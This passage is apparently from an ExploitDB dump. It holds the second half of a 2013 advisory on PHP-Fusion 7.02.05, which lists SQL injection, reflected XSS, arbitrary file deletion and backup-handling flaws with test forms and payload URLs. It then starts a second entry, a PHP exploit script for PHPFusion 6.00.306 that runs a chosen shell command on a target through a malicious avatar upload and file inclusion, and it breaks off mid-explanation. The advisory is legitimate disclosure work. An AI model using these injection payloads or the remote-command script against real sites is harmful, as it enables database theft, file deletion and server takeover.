]------------------------------------\r\n\r\nResult (302 redirect makes it difficult to see SQL error, Burp Proxy will help):\r\n\r\nYou have an error in your SQL syntax; check the manual that corresponds to your\r\nMySQL server version for the right syntax to use near \'axe\'\' at line 1\r\n\r\n\r\n###############################################################################\r\n6. SQL Injection in "forum/postnewthread.php"\r\n###############################################################################\r\n\r\nReason: uninitialized variable "$poll_opts"\r\nAttack vector: user-supplied parameter "poll_opts"\r\nPreconditions:\r\n1. logged in as user with poll creation privileges\r\n2. available forum with poll creation abilities\r\n3. magic_quotes_gpc=off\r\n4. register_globals=on\r\n \r\n \r\nPhp script "forum/postnewthread.php" line 126:\r\n------------------------[ source code start ]----------------------------------\r\nforeach ($poll_opts as $poll_option) {\r\n    $result = dbquery("INSERT INTO ".DB_FORUM_POLL_OPTIONS." (thread_id,\r\n    forum_poll_option_id, forum_poll_option_text, forum_poll_option_votes)\r\n    VALUES(\'".$thread_id."\', \'".$i."\', \'".$poll_option."\', \'0\')");\r\n    $i++;\r\n}\r\n------------------------[ source code end ]------------------------------------\r\n\r\nTest (parameter "forum_id" must be valid):\r\n\r\n-------------------------[ test code start ]-----------------------------------\r\n<html><body><center>\r\n<form action="http://localhost/phpfusion70205/forum/post.php?action=newthread&forum_id=2" method="post">\r\n<input type="hidden" name="subject" value="Test subject">\r\n<input type="hidden" name="message" value="Test message">\r\n<input type="hidden" name="poll_title" value="Test poll">\r\n<input type="hidden" name="poll_opts[]" value="war\'axe">\r\n<input type="hidden" name="postnewthread" value="1">\r\n<input type="submit" value="Test">\r\n</form>\r\n</center></body></html>\r\n--------------------------[ test code end ]------------------------------------\r\n\r\nResult (302 redirect makes it difficult to see SQL error, Burp Proxy will help):\r\n\r\nYou have an error in your SQL syntax; check the manual that corresponds to your\r\nMySQL server version for the right syntax to use near \'axe\', \'0\')\' at line 1\r\n\r\n\r\n\r\n###############################################################################\r\n7. SQL Injection in "administration/settings_messages.php"\r\n###############################################################################\r\n\r\nReason: insufficient sanitization of user-supplied data\r\nAttack vector: user-supplied POST parameters "pm_email_notify", "pm_save_sent",\r\n "pm_inbox", "pm_sentbox", "pm_savebox"\r\nPreconditions:\r\n 1. logged in as admin with private message settings change privileges\r\n 2. magic_quotes_gpc=off\r\n \r\n \r\nPhp script "administration/settings_messages.php" line 38:\r\n------------------------[ source code start ]----------------------------------\r\nif (isset($_POST[\'saveoptions\'])) {\r\n    $error = 0;\r\n    dbquery("UPDATE ".DB_MESSAGES_OPTIONS." SET\r\n        pm_email_notify = \'".$_POST[\'pm_email_notify\']."\',\r\n        pm_save_sent = \'".$_POST[\'pm_save_sent\']."\',\r\n        pm_inbox = \'".$_POST[\'pm_inbox\']."\',\r\n        pm_sentbox = \'".$_POST[\'pm_sentbox\']."\',\r\n        pm_savebox = \'".$_POST[\'pm_savebox\']."\'\r\n        WHERE user_id=\'0\'"\r\n    );\r\n------------------------[ source code end ]------------------------------------\r\n\r\n\r\n###############################################################################\r\n8. SQL Injection in "administration/settings_photo.php"\r\n###############################################################################\r\n\r\nReason: insufficient sanitization of user-supplied data\r\nAttack vector: user-supplied POST parameters "thumb_compression",\r\n"photo_watermark_text_color1", "photo_watermark_text_color2", "photo_watermark_text_color3"\r\nPreconditions:\r\n 1. logged in as admin with photo gallery settings change privileges\r\n 2. magic_quotes_gpc=off\r\n \r\n \r\nPhp script "administration/settings_photo.php" line 100:\r\n------------------------[ source code start ]----------------------------------\r\n$result = dbquery("UPDATE ".DB_SETTINGS." SET settings_value=\'".$_POST[\'thumb_compression\']."\'\r\nWHERE settings_name=\'thumb_compression\'");\r\n...\r\n$result = dbquery("UPDATE ".DB_SETTINGS." SET settings_value=\r\n\'".(preg_match("/([0-9A-F]){6}/i",$_POST[\'photo_watermark_text_color1\']) ?\r\n $_POST[\'photo_watermark_text_color1\'] : "FF6600")."\' WHERE settings_name=\'photo_watermark_text_color1\'");\r\nif (!$result) { $error = 1; }\r\n$result = dbquery("UPDATE ".DB_SETTINGS." SET settings_value=\r\n\'".(preg_match("/([0-9A-F]){6}/i",$_POST[\'photo_watermark_text_color2\']) ?\r\n $_POST[\'photo_watermark_text_color2\'] : "FFFF00")."\' WHERE settings_name=\'photo_watermark_text_color2\'");\r\nif (!$result) { $error = 1; }\r\n$result = dbquery("UPDATE ".DB_SETTINGS." SET settings_value=\'\r\n".(preg_match("/([0-9A-F]){6}/i",$_POST[\'photo_watermark_text_color3\']) ?\r\n $_POST[\'photo_watermark_text_color3\'] : "FFFFFF")."\' WHERE settings_name=\'photo_watermark_text_color3\'");\r\n------------------------[ source code end ]------------------------------------\r\n\r\nWe can see, that user-supplied POST parameter "thumb_compression" is used in\r\nSQL query without any sanitization. Other three affected parameters\r\n"photo_watermark_text_color1", photo_watermark_text_color2", "photo_watermark_text_color1"\r\nare checked against regex, but this regex is flawed and does not stop SQL injection.\r\nAttacker can use "AABBCC\'waraxe" and regex check is bypassed.\r\nCorrect regex would be "/^([0-9A-F]){6}$/i".\r\n\r\n\r\n###############################################################################\r\n9. SQL Injection in "administration/bbcodes.php"\r\n###############################################################################\r\n\r\nReason: insufficient sanitization of user-supplied data\r\nAttack vector: user-supplied GET parameter "enable"\r\nPreconditions:\r\n 1. logged in as admin with BB Codes administration privileges\r\n 2. magic_quotes_gpc=off\r\n 3. PHP must be < 5.3.4 for null-byte attacks to work\r\n \r\n \r\nPhp script "administration/bbcodes.php" line 49:\r\n------------------------[ source code start ]----------------------------------\r\n} elseif (isset($_GET[\'enable\']) &&\r\n file_exists(INCLUDES."bbcodes/".$_GET[\'enable\']."_bbcode_include_var.php") &&\r\n file_exists(INCLUDES."bbcodes/".$_GET[\'enable\']."_bbcode_include.php")) {\r\n...\r\n $result = dbquery("INSERT INTO ".DB_BBCODES." (bbcode_name, bbcode_order)\r\n  VALUES (\'".$_GET[\'enable\']."\', \'".$order."\')");\r\n------------------------[ source code end ]------------------------------------\r\n\r\nWe can see, that user-supplied GET parameter "enable" is used in SQL query\r\nwithout sufficient sanitization. There are two checks against valid filenames,\r\nbut it\'s possible to use null byte method to bypass these checks.\r\n\r\nTest (parameter "aid" needs to be valid):\r\n\r\nhttp://localhost/phpfusion70205/administration/bbcodes.php?aid=c37dd1f4ea5686c5&enable=%00war\'axe\r\n\r\nResult (302 redirect makes it difficult to see SQL error, Burp Proxy will help):\r\n\r\nYou have an error in your SQL syntax; check the manual that corresponds to your\r\nMySQL server version for the right syntax to use near \'axe\', \'13\')\' at line 1\r\n\r\n\r\n###############################################################################\r\n10. SQL Injection in "administration/news.php" case 1\r\n###############################################################################\r\n\r\nReason: insufficient sanitization of user-supplied data\r\nAttack vector: user-supplied POST parameters "news_image", "news_image_t1"\r\n and "news_image_t1"\r\nPreconditions:\r\n 1. logged in as admin with news administration privileges\r\n 2. magic_quotes_gpc=off\r\n \r\n \r\nPhp script "administration/news.php" line 106:\r\n------------------------[ source code start ]----------------------------------\r\n$news_image = (isset($_POST[\'news_image\']) ? $_POST[\'news_image\'] : "");\r\n$news_image_t1 = (isset($_POST[\'news_image_t1\']) ? $_POST[\'news_image_t1\'] : "");\r\n$news_image_t2 = (isset($_POST[\'news_image_t2\']) ? $_POST[\'news_image_t2\'] : "");\r\n...\r\n$result = dbquery("UPDATE ".DB_NEWS." SET news_subject=\'$news_subject\', \r\n news_cat=\'$news_cat\', news_end=\'$news_end_date\', news_image=\'$news_image\',\r\n news_news=\'$body\', news_extended=\'$body2\', news_breaks=\'$news_breaks\',\r\n ".($news_start_date != 0 ? " news_datestamp=\'$news_start_date\'," : "").\r\n " news_start=\'$news_start_date\', news_image_t1=\'$news_image_t1\', news_image_t2=\r\n \'$news_image_t2\', news_visibility=\'$news_visibility\', news_draft=\'$news_draft\',\r\n news_sticky=\'$news_sticky\', news_allow_comments=\'$news_comments\', \r\n news_allow_ratings=\'$news_ratings\' WHERE news_id=\'".$_POST[\'news_id\']."\'");\r\n------------------------[ source code end ]------------------------------------\r\n\r\nTest (parameter "aid" needs to be valid):\r\n\r\n-------------------------[ test code start ]-----------------------------------\r\n<html><body><center>\r\n<form action="http://localhost/phpfusion70205/administration/news.php?aid=0ebd6f54040890e8" method="post">\r\n<input type="hidden" name="save" value="1">\r\n<input type="hidden" name="news_image" value="war\'axe">\r\n<input type="hidden" name="news_image_t1" value="war\'axe2">\r\n<input type="hidden" name="news_image_t2" value="war\'axe3">\r\n<input type="submit" value="Test">\r\n</form>\r\n</center></body></html>\r\n--------------------------[ test code end ]------------------------------------\r\n\r\nResult (302 redirect makes it difficult to see SQL error, Burp Proxy will help):\r\n\r\nYou have an error in your SQL syntax; check the manual that corresponds to your\r\nMySQL server version for the right syntax to use\r\nnear \'axe\', \'war\'axe2\', \'war\'axe3\', \'0\', \'0\', \'0\', \'0\', \'0\', \'0\')\' at line 1\r\n\r\n\r\n###############################################################################\r\n11. SQL Injection in "administration/articles.php"\r\n###############################################################################\r\n\r\nReason: insufficient sanitization of user-supplied data\r\nAttack vector: user-supplied POST parameter "article_id"\r\nPreconditions:\r\n 1. Logged in as admin with articles administration privileges\r\n 2. magic_quotes_gpc=off\r\n \r\n \r\nPhp script "administration/articles.php" line :\r\n------------------------[ source code start ]----------------------------------\r\nif ((isset($_GET[\'action\']) && $_GET[\'action\'] == "edit") && \r\n   (isset($_POST[\'article_id\']) && isnum($_POST[\'article_id\'])) || \r\n     (isset($_GET[\'article_id\']) && isnum($_GET[\'article_id\']))) {\r\n  $result = dbquery("SELECT article_cat, article_subject, article_snippet,\r\n   article_article, article_draft, article_breaks, article_allow_comments, \r\n   article_allow_ratings FROM ".DB_ARTICLES." WHERE \r\n   article_id=\'".(isset($_POST[\'article_id\']) ? $_POST[\'article_id\'] : $_GET[\'article_id\'])."\'")\r\n------------------------[ source code end ]------------------------------------\r\n\r\nAs seen above, user-supplied parameter "article_id" goes through validation\r\nbefore using in SQL query, but this validation has flawed logic. If we submit\r\nnumeric GET parameter "article_id" and non-numeric malicious POST parameter\r\nwith the same name, then first check will pass, because GET parameter\r\nis valid, but after that POST parameter is used in SQL query ...\r\n\r\nTest (parameter "aid" must be valid):\r\n\r\n-------------------------[ test code start ]-----------------------------------\r\n<html><body><center>\r\n<form action="http://localhost/phpfusion70205/administration/articles.php?aid=0ebd6f54040890e8&action=edit&article_id=123" method="post">\r\n<input type="hidden" name="article_id" value="0\'UNION SELECT 1,@@version,3,4,5,6,7,\'8">\r\n<input type="submit" value="Test">\r\n</form>\r\n</center></body></html>\r\n--------------------------[ test code end ]------------------------------------\r\n\r\n\r\n###############################################################################\r\n12. SQL Injection in "administration/news.php" case 2\r\n###############################################################################\r\n\r\nReason: insufficient sanitization of user-supplied data\r\nAttack vector: user-supplied POST parameter "news_id"\r\nPreconditions:\r\n 1. logged in as admin with news administration privileges\r\n 2. magic_quotes_gpc=off\r\n \r\nThis security vulnerability is similar to the previous case. User-supplied\r\ndata verification exists, but it\'s not able to stop SQL injection due to flawed\r\nlogic.\r\n \r\nPhp script "administration/news.php" line 236:\r\n------------------------[ source code start ]----------------------------------\r\nif ((isset($_GET[\'action\']) && $_GET[\'action\'] == "edit") &&\r\n  (isset($_POST[\'news_id\']) && isnum($_POST[\'news_id\'])) || \r\n  (isset($_GET[\'news_id\']) && isnum($_GET[\'news_id\']))) {\r\n $result = dbquery("SELECT news_subject, news_cat, news_news, news_extended, \r\n news_start, news_end, news_image, news_image_t1, news_image_t2, news_visibility,\r\n news_draft, news_sticky, news_breaks, news_allow_comments, news_allow_ratings\r\n FROM ".DB_NEWS." WHERE news_id=\'".(isset($_POST[\'news_id\']) ? $_POST[\'news_id\']\r\n : $_GET[\'news_id\'])."\' LIMIT 1");\r\n------------------------[ source code end ]------------------------------------\r\n\r\nTest (parameter "aid" needs to be valid):\r\n\r\n-------------------------[ test code start ]-----------------------------------\r\n<html><body><center>\r\n<form action="http://localhost/phpfusion70205/administration/news.php?aid=0ebd6f54040890e8&action=edit&news_id=123" method="post">\r\n<input type="hidden" name="news_id" value="0\'UNION SELECT 1,2,@@version,4,5,6,7,8,9,10,11,12,13,14,\'15">\r\n<input type="submit" value="Test">\r\n</form>\r\n</center></body></html>\r\n--------------------------[ test code end ]------------------------------------\r\n\r\n\r\n###############################################################################\r\n13. Reflected XSS in "forum/viewthread.php"\r\n###############################################################################\r\n\r\nReason: insufficient sanitization of html output\r\nAttack vector: user-supplied GET parameter "highlight"\r\nPreconditions:\r\n 1. there must exist at least one forum thread\r\n \r\n\r\nPhp script "forum/viewthread.php" line 361:\r\n------------------------[ source code start ]----------------------------------\r\n    // highlight jQuery plugin\r\n    if (isset($_GET[\'highlight\'])) {\r\n        $words = explode(" ", urldecode($_GET[\'highlight\']));\r\n        $higlight = ""; $i = 1; $c_words = count($words);\r\n        foreach ($words as $hlight) {\r\n            $higlight .= "\'".$hlight."\'";\r\n            $higlight .= ($i < $c_words ? "," : "");\r\n            $i++;\r\n        }\r\n        add_to_head("<script type=\'text/javascript\' src=\'".INCLUDES."jquery/jquery.highlight.js\'></script>");\r\n        $highlight_js .=   "jQuery(\'.search_result\').highlight([".$higlight."],{wordsOnly:true});";\r\n------------------------[ source code end ]------------------------------------\r\n\r\nTest (parameter "thread_id" must be valid):\r\n\r\nhttp://localhost/phpfusion70205/forum/viewthread.php?thread_id=20&highlight=%2527]);});alert(123);/*\r\n\r\n\r\n###############################################################################\r\n14. Reflected XSS in "messages.php"\r\n###############################################################################\r\n\r\nReason:\r\n 1. uninitialized variables "$user_list" and "$user_types"\r\n 2. insufficient sanitization of html output\r\nAttack vector: user-supplied parameters "user_list", "user_types"\r\nPreconditions:\r\n 1. logged in as user\r\n 2. register_globals=on\r\n \r\n \r\nPhp script "messages.php" line 482:\r\n------------------------[ source code start ]----------------------------------\r\nif ($_GET[\'msg_send\'] == "0") {\r\n    echo "<select name=\'msg_send\' class=\'textbox\'>\\n".$user_list."</select>\\n";\r\n------------------------[ source code end ]------------------------------------\r\n\r\nTest:\r\n\r\n-------------------------[ test code start ]-----------------------------------\r\n<html><body><center>\r\n<form action="http://localhost/phpfusion70205/messages.php?msg_send=0" method="post">\r\n<input type="hidden" name="chk_sendtoall" value="0">\r\n<input type="hidden" name="user_list" value="</select><script>alert(123);</script>">\r\n<input type="submit" value="Test">\r\n</form>\r\n</center></body></html>\r\n--------------------------[ test code end ]------------------------------------\r\n\r\nSimilar problem is related to variable "$user_types", only in this case admin\r\naccess level is needed:\r\n\r\nPhp script "messages.php" line 490:\r\n------------------------[ source code start ]----------------------------------\r\nif (iADMIN && !isset($_GET[\'msg_id\'])) {\r\n    echo "<label><input name=\'chk_sendtoall\' type=\'checkbox\' ".$sendtoall_chk." />\\n";\r\n    echo "".$locale[\'434\'].":</label> <select name=\'msg_to_group\' class=\'textbox\'>\\n".$user_types."</select>\\n";\r\n------------------------[ source code end ]------------------------------------\r\n\r\n\r\n###############################################################################\r\n15. Reflected XSS in "infusions/shoutbox_panel/shoutbox_admin.php"\r\n###############################################################################\r\nReason:\r\n 1. uninitialized variable "$message"\r\n 2. insufficient sanitization of html output\r\nAttack vector: user-supplied parameter "message"\r\nPreconditions:\r\n 1. logged in as admin with shoutbox administration privileges\r\n 2. register_globals=on\r\n \r\nPhp script "infusions/shoutbox_panel/shoutbox_admin.php" line 149:\r\n------------------------[ source code start ]----------------------------------\r\nif (isset($message) && $message != "") {\r\n echo "<div id=\'close-message\'><div class=\'admin-message\'>".$message."</div></div>\\n"; }\r\n------------------------[ source code end ]------------------------------------\r\n\r\nTest (parameter "aid" needs to be valid):\r\n\r\nhttp://localhost/phpfusion70205/infusions/shoutbox_panel/shoutbox_admin.php?\r\naid=e017e24eb00e8ccf&page=settings&message=<body+onload=alert(123);+\r\n\r\n\r\n###############################################################################\r\n16. Reflected XSS in "administration/news.php"\r\n###############################################################################\r\nReason:\r\n 1. uninitialized variable "$message"\r\n 2. insufficient sanitization of html output\r\nAttack vector: user-supplied parameter "message"\r\nPreconditions:\r\n 1. logged in as admin with news administration privileges\r\n 2. register_globals=on\r\n \r\nPhp script "administration/news.php" line 31:\r\n------------------------[ source code start ]----------------------------------\r\nif (isset($_GET[\'error\']) && isnum($_GET[\'error\'])) {\r\n    if ($_GET[\'error\'] == 1) {\r\n        $message = $locale[\'413\'];\r\n...\r\n    if ($message) {    echo "<div id=\'close-message\'>\r\n      <div class=\'admin-message\'>".$message."</div></div>\\n"; }\r\n}\r\nif (isset($_GET[\'status\'])) {\r\n    if ($_GET[\'status\'] == "sn") {\r\n        $message = $locale[\'410\'];\r\n...\r\n    if ($message) {    echo "<div id=\'close-message\'>\r\n      <div class=\'admin-message\'>".$message."</div></div>\\n"; }\r\n}\r\n------------------------[ source code end ]------------------------------------\r\n\r\nTests (parameter "aid" needs to be valid):\r\n\r\nhttp://localhost/phpfusion70205/administration/news.php?aid=0ebd6f54040890e8\r\n&error=9&message=<body+onload=alert(123);+\r\n\r\nhttp://localhost/phpfusion70205/administration/news.php?aid=0ebd6f54040890e8\r\n&status=1&message=<body+onload=alert(123);+\r\n\r\n\r\n###############################################################################\r\n17. Reflected XSS in "administration/panel_editor.php"\r\n###############################################################################\r\n\r\nReason:\r\n 1. uninitialized variable "$panel_list"\r\n 2. insufficient sanitization of html output\r\nAttack vector: user-supplied parameter "panel_list"\r\nPreconditions:\r\n 1. logged in as admin with panel editing privileges\r\n 2. register_globals=on\r\n \r\n \r\nPhp script "administration/panel_editor.php" line 32:\r\n------------------------[ source code start ]----------------------------------\r\nwhile ($folder = readdir($temp)) {\r\n    if (!in_array($folder, array(".","..")) && strstr($folder, "_panel")) {\r\n        if (is_dir(INFUSIONS.$folder)) $panel_list[] = $folder;\r\n    }\r\n}\r\n...\r\nfor ($i=0;$i < count($panel_list);$i++) {\r\n        echo "<option".($panel_filename == $panel_list[$i] ? \r\n            " selected=\'selected\'" : "").">".$panel_list[$i]."</option>\\n";\r\n\r\n------------------------[ source code end ]------------------------------------\r\n\r\nTest (parameter "aid" needs to be valid):\r\n\r\n-------------------------[ test code start ]-----------------------------------\r\n<html><body><center>\r\n<form action="http://localhost/phpfusion70205/administration/panel_editor.php?aid=e017e24eb00e8ccf" method="post">\r\n<input type="hidden" name="panel_list[]" value="<script>alert(123);</script>">\r\n<input type="submit" value="Test">\r\n</form>\r\n</center></body></html>\r\n--------------------------[ test code end ]------------------------------------\r\n\r\n\r\n###############################################################################\r\n18. Reflected XSS in "administration/phpinfo.php"\r\n###############################################################################\r\n\r\nReason: insufficient sanitization of html output\r\nAttack vector: User-Agent string \r\nPreconditions: \r\n 1. logged in as admin with php info view privileges\r\n \r\nPhp script "administration/phpinfo.php" line 46:\r\n------------------------[ source code start ]----------------------------------\r\n$phpinfo .= "<tr>\\n<td class=\'tbl2\' style=\'width:20%\'>".$locale[\'410\']."</td>\r\n<td class=\'tbl1\' style=\'text-align:right\'>".$_SERVER[\'HTTP_USER_AGENT\']."</td></tr>\\n";\r\n------------------------[ source code end ]------------------------------------\r\n\r\n\r\n###############################################################################\r\n19. Reflected XSS in "administration/bbcodes.php"\r\n###############################################################################\r\n\r\nReason:\r\n 1. uninitialized variable "$__BBCODE__"\r\n 2. insufficient sanitization of html output\r\nAttack vector: user-supplied parameter "__BBCODE__"\r\nPreconditions:\r\n 1. logged in as admin with bbcode settings change privileges\r\n 2. register_globals=on\r\n \r\n \r\nPhp script "administration/bbcodes.php" line 141:\r\n------------------------[ source code start ]----------------------------------\r\necho "<td class=\'$cls\'>".$__BBCODE__[0][\'description\']."</td>\\n";\r\necho "<td class=\'$cls\'>".$__BBCODE__[0][\'usage\']."</td>\\n";\r\n------------------------[ source code end ]------------------------------------\r\n\r\nTest (parameter "aid" needs to be valid):\r\n\r\nhttp://localhost/phpfusion70205/administration/bbcodes.php?aid=693ec1754cc0b042\r\n&__BBCODE__[0][description]=<body+onload=alert(123);+\r\n\r\nhttp://localhost/phpfusion70205/administration/bbcodes.php?aid=693ec1754cc0b042\r\n&__BBCODE__[0][usage]=<body+onload=alert(123);+\r\n\r\n###############################################################################\r\n20. Reflected XSS in multiple admin scripts, affected parameter "errorMessage"\r\n###############################################################################\r\n\r\nReason:\r\n 1. uninitialized variables "$error" and "$errorMessage"\r\n 2. insufficient sanitization of html output\r\nAttack vector: user-supplied parameters "error" and "errorMessage"\r\nPreconditions:\r\n 1. logged in as admin with appropriate privileges\r\n 2. register_globals=on\r\n \r\n \r\nPhp script "administration/article_cats.php" line 110:\r\n------------------------[ source code start ]----------------------------------\r\n    if (isset($error) && isnum($error)) {\r\n        if ($error == 1) {\r\n            $errorMessage = $locale[\'460\'];\r\n        } elseif ($error == 2) {\r\n            $errorMessage = $locale[\'461\'];\r\n        }\r\n        if ($errorMessage) { echo "<div id=\'close-message\'>\r\n          <div class=\'admin-message\'>".$errorMessage."</div></div>\\n"; }\r\n------------------------[ source code end ]------------------------------------\r\n\r\nThe same vulnerability exists in four different admin scripts:\r\n\r\n1. administration/article_cats.php\r\n2. administration/download_cats.php\r\n3. administration/news_cats.php\r\n4. administration/weblink_cats.php\r\n\r\nTests (parameter "aid" needs to be valid):\r\n\r\nhttp://localhost/phpfusion70205/administration/article_cats.php?\r\naid=6242719852b67e0e&error=3&errorMessage=<body+onload=alert(123);+\r\n\r\nhttp://localhost/phpfusion70205/administration/download_cats.php?\r\naid=6242719852b67e0e&error=3&errorMessage=<body+onload=alert(123);+\r\n\r\nhttp://localhost/phpfusion70205/administration/news_cats.php?\r\naid=6242719852b67e0e&error=3&errorMessage=<body+onload=alert(123);+\r\n\r\nhttp://localhost/phpfusion70205/administration/weblink_cats.php?\r\naid=6242719852b67e0e&error=3&errorMessage=<body+onload=alert(123);+\r\n\r\n\r\n###############################################################################\r\n21. Reflected XSS in "administration/articles.php"\r\n###############################################################################\r\n\r\nReason: insufficient sanitization of html output\r\nAttack vector: user-supplied POST parameters "body" and "body2"\r\nPreconditions:\r\n 1. logged in as admin with articles administration privileges\r\n\r\n  \r\nPhp script "administration/articles.php" line 70:\r\n------------------------[ source code start ]----------------------------------\r\n$bodypreview = str_replace("src=\'".str_replace("../", "", IMAGES_A), \r\n "src=\'".IMAGES_A, stripslash($_POST[\'body\']));\r\n$body2preview = str_replace("src=\'".str_replace("../", "", IMAGES_A), \r\n "src=\'".IMAGES_A, stripslash($_POST[\'body2\']));\r\n...\r\necho $bodypreview."\\n";\r\n...\r\necho $body2preview."\\n";\r\n------------------------[ source code end ]------------------------------------\r\n\r\nTest (parameter "aid" needs to be valid):\r\n\r\n-------------------------[ test code start ]-----------------------------------\r\n<html><body><center>\r\n<form action="http://localhost/phpfusion70205/administration/articles.php?aid=0ebd6f54040890e8" method="post">\r\n<input type="hidden" name="preview" value="1">\r\n<input type="hidden" name="body" value="<script>alert(123);</script>">\r\n<input type="hidden" name="body2" value="<script>alert(321);</script>">\r\n<input type="submit" value="Test">\r\n</form>\r\n</center></body></html>\r\n--------------------------[ test code end ]------------------------------------\r\n\r\n\r\n###############################################################################\r\n22. Arbitrary file deletion in "administration/db_backup.php"\r\n###############################################################################\r\n\r\nReason: insufficient sanitization of user-supplied data\r\nAttack vector: user-supplied  POST parameter "file"\r\nPreconditions:\r\n 1. logged in as admin with database backup privileges\r\n\r\n \r\nPhp script "administration/db_backup.php" line 130:\r\n------------------------[ source code start ]----------------------------------\r\nif (isset($_POST[\'btn_cancel\'])) {\r\n    @unlink(ADMIN."db_backups/".$_POST[\'file\']);\r\n    redirect(FUSION_SELF.$aidlink);\r\n}\r\n------------------------[ source code end ]------------------------------------\r\n\r\nAs we can see, user-supplied  POST parameter "file" is used in php function\r\n"unlink()" without any sanitization. It\'s possible to use directory traversal\r\nstrings "../" and delete arbitrary files on the target system.\r\n\r\n\r\n###############################################################################\r\n23. Insecure database backup file handling in "administration/db_backup.php"\r\n###############################################################################\r\n\r\nPHP-Fusion admin with Database Backup privileges can use "Database Restore"\r\nfeature. First step is database backup file upload:\r\n  \r\nPhp script "administration/db_backup.php" line 186:\r\n------------------------[ source code start ]----------------------------------\r\n} elseif (isset($_GET[\'action\']) && $_GET[\'action\'] == "restore") {\r\n if (is_uploaded_file($_FILES[\'upload_backup_file\'][\'tmp_name\'])) {\r\n   $temp_rand = rand(1000000, 9999999);\r\n   $temp_hash = substr(md5($temp_rand), 8, 8);\r\n   $file = "temp_".$temp_rand.".txt";\r\n   $backup_name = $_FILES[\'upload_backup_file\'][\'name\'];\r\n   move_uploaded_file($_FILES[\'upload_backup_file\'][\'tmp_name\'], ADMIN."db_backups/".$file);\r\n------------------------[ source code end ]------------------------------------\r\n\r\nAs we can see, uploaded file will be moved to "db_backups" directory.\r\nTwo problems exist with that:\r\n\r\n1. There is no access restrictions to this directory. Anyone can access uploaded\r\ndatabase backup files directly, given that filename is known:\r\n\r\nhttp://localhost/phpfusion70205/administration/db_backups/temp_4973205.txt\r\n\r\n2. Database backup\'s filename is suppose to be random, but there is only about\r\n9 million possible filenames. Such weak filename randomness makes it possible\r\nto try bruteforce guessing.\r\n\r\nUploaded files are usually deleted within short timeframe, but may be left\r\nintact for indefinite time period, if admin does not complete operation and\r\ndoes not access database backup script again. In this case filename bruteforce\r\nmay be realistic and as result sensitive data leakage from database may occur\r\n(hashed admin credentials for example).\r\n\r\nPossible solutions:\r\n 1. .htaccess file restricting directory access\r\n 2. better filename randomness\r\n\r\n\r\nDisclosure timeline:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\n27.09.2012 -> Contacted developers\r\n27.09.2012 -> Developer asked for details\r\n28.09.2012 -> Sent details to developers\r\n27.01.2013 -> Patched version 7.02.06 released\r\n27.02.2013 -> Advisory released\r\n\r\n\r\nContact:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\ncome2waraxe@yahoo.com\r\nJanek Vind "waraxe"\r\n\r\nWaraxe forum:  http://www.waraxe.us/forums.html\r\nPersonal homepage: http://www.janekvind.com/\r\nRandom project: http://albumnow.com/\r\n---------------------------------- [ EOF ] ------------------------------------', u'description': u'PHP-Fusion 7.02.05 - Multiple Vulnerabilities', u'platform': u'php', u'author': u'waraxe', u'cve': [], u'source': u'ExploitDB', u'date': u'2013-03-01T00:00:00+00:00', u'_id': 24562, u'type': u'webapps', u'port': 0}

CVE: []
Description: PHP-Fusion 6.00.306 - Multiple Vulnerabilities
{u'code': u'#!/usr/bin/php -q -d short_open_tag=on\r\n<?\r\necho "PHPFusion <= v6.00.306 avatar mod_mime arbitrary file upload &\\r\\n";\r\necho "local inclusion vulnerabilities\\r\\n";\r\necho "by rgod rgod@autistici.org\\r\\n";\r\necho "site: http://retrogod.altervista.org\\r\\n\\r\\n";\r\n\r\nif ($argc<6) {\r\necho "Usage: php ".$argv[0]." host path user pass cmd OPTIONS\\r\\n";\r\necho "host:      target server (ip/hostname)\\r\\n";\r\necho "path:      path to PHPFusion\\r\\n";\r\necho "cmd:       a shell command\\r\\n";\r\necho "user/pass: you need a valid user account to upload an avatar\\r\\n";\r\necho "Options:\\r\\n";\r\necho "   -p[port]:    specify a port other than 80\\r\\n";\r\necho "   -P[ip:port]: specify a proxy\\r\\n";\r\necho "Examples:\\r\\n";\r\necho "php ".$argv[0]." localhost /phpfusion/ your_username password cat ./../../config.php\\r\\n";\r\necho "php ".$argv[0]." localhost /phpfusion/ your_username password ls -la -p81\\r\\n";\r\necho "php ".$argv[0]." localhost / your_username password ls -la -P1.1.1.1:80\\r\\n\\r\\n";\r\ndie;\r\n}\r\n\r\n/* explaination:\r\n\r\n   software site: http://www.php-fusion.co.uk/\r\n\r\n   description: "a light-weight open-source content management system (CMS)\r\n   written in PHP. It utilises a mySQL database to store your site content and\r\n   includes a simple, comprehensive adminstration system."\r\n\r\n   tested versions:   PHPFusion v6.00.306\r\n                      PHPFusion v6.00.207\r\n                      PHPFusion v6.00.110\r\n\r\n\r\n   i) vulnerable code in includes/update_profile_include.php at lines 69-90:\r\n\r\n   ...\r\n   $newavatar = $_FILES[\'user_avatar\'];\r\n\tif ($userdata[\'user_avatar\'] == "" && !empty($newavatar[\'name\']) && is_uploaded_file($newavatar[\'tmp_name\'])) {\r\n\t\tif (preg_match("/^[-0-9A-Z_\\.\\[\\]]+$/i", $newavatar[\'name\']) && $newavatar[\'size\'] <= 30720) {\r\n                       \t$avatarext = strrchr($newavatar[\'name\'],".");\r\n\t\t\tif (eregi(".gif", $avatarext) || eregi(".jpg", $avatarext) || eregi(".png", $avatarext)) {\r\n\t\t\t\t$avatarname = substr($newavatar[\'name\'], 0, strrpos($newavatar[\'name\'], "."));\r\n\t\t\t\t$avatarname = $avatarname."[".$userdata[\'user_id\']."]".$avatarext;\r\n\t\t\t\t$set_avatar = "user_avatar=\'$avatarname\', ";\r\n\t\t\t\tmove_uploaded_file($newavatar[\'tmp_name\'], IMAGES."avatars/".$avatarname);\r\n\t\t\t\tchmod(IMAGES."avatars/".$avatarname,0644);\r\n\t\t\t\tif ($size = @getimagesize(IMAGES."avatars/".$avatarname)) {\r\n\t\t\t\t\tif ($size[\'0\'] > 100 || $size[\'1\'] > 100) {\r\n\t\t\t\t\t\tunlink(IMAGES."avatars/".$avatarname);\r\n\t\t\t\t\t\t$set_avatar = "";\r\n\t\t\t\t\t}\r\n\t\t\t\t} else {\r\n\t\t\t\t\tunlink(IMAGES."avatars/".$avatarname);\r\n\t\t\t\t\t$set_avatar = "";\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n   ...\r\n\r\n   A remote user can upload a malicious avatar with multiple extensions,\r\n   (ex.: .php.php.gif-fakechars-) and with php code inside as EXIF 